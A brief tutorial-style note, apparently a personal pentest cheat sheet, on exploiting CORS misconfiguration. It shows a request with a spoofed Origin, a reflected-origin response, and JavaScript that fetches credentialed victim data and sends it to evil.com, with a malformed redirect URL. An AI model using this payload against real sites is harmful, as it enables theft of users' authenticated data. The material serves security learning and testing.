# misconfig

1.Burp: [https://portswigger.net/web-security/cors](https://portswigger.net/web-security/cors)

2. [https://medium.com/@amangupta566/cors-misconfiguration-leads-to-steal-sensitive-information-disclosure-fdf050b68b66](https://medium.com/@amangupta566/cors-misconfiguration-leads-to-steal-sensitive-information-disclosure-fdf050b68b66)



## How to:

#### 1. set the origin:

```text
GET /sensitiveData HTTP/1.1
Host: vulnerable.com
Origin: 
https://evil.com

```





#### 2. find the response that can be controlled:

```text
HTTP/1.1 200 OK 
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

The `Access-Control-Allow-Origin` be written by Origin and \`Access-Control-Allow-Credentials\` is true.



#### 3. use the js to interact with the service:

```javascript
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='//https://evil.com/log?key='+this.responseText;
};
```

The sensitive response information will be sent to the evil.com..

